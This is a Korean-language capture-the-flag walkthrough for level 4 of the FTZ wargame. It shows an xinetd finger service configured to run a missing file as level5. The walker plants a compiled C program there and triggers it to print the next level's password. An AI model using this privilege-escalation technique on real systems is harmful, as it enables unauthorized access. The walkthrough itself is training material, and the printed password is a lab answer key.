## level4

#### 실행

``` //
[level4@ftz levl4]$cat hint // hint 파일의 내용을 화면에 출력한다.
```

#### 결과

```
누군가 /etc/xinetd.d/에 백도어를 심어놓았다.! 
```

--------

#### 실행

```
[leve14@ftz level4]$ls /etc/xinetd.d //xinet.d 아래의 파일이나 디렉토리 확인한다.
```

#### 결과

```/bin/ExceteMe
backdoor daytime echo-udp rexec rsync sgi_fam time
chargen daytime-udp finger rlogin servers talk time-udp
chargen-udp echo ntalk rsh services telnet 
```

---------

#### 실행

```
[level4@ftz level4]$cat /etc/xinetd.d/backdoor // backdoor 파일의 내용을 화면에 출력한다.
```

#### 결과

```
service finger
{
 disable = no
 flags = REUSE
 socket_type = stream
 wait = no
 user = level5
 server = /home/level4/tmp/backdoor
 log_on_failure += USERID
} // finger 서비스를 통해 level5 권한으로 /home/level4/tmp/backdoor를 실행한다.
```

-------------------

#### 실행

```
[level4@ftz level4]$ cd /home/level4/tmp/backdoor // 경로로 현재 위치를 변경한다.
```

#### 결과

```
-bash: cd: /home/level4/tmp/backdoor: No such file or directory // backdoor 파일이 존재하지 않는다.
```

--------

#### 실행

```
[level4@ftz level4]$ cd /home/level4/tmp
[level4@ftz tmp]$ cat > backdoor.c
#include<stdlib.h>

int main(void){
	system("my-pass");
	return 0;
}
[level4@ftz tmp]$ gcc backdoor.c -o backdoor
```

#### 결과

```
[level4@ftz tmp]$
```

----------------

#### 실행

```
[level4@ftz tmp]$ finger @localhost
```

#### 결과

```
Level5 Password is "what is your name?".
```

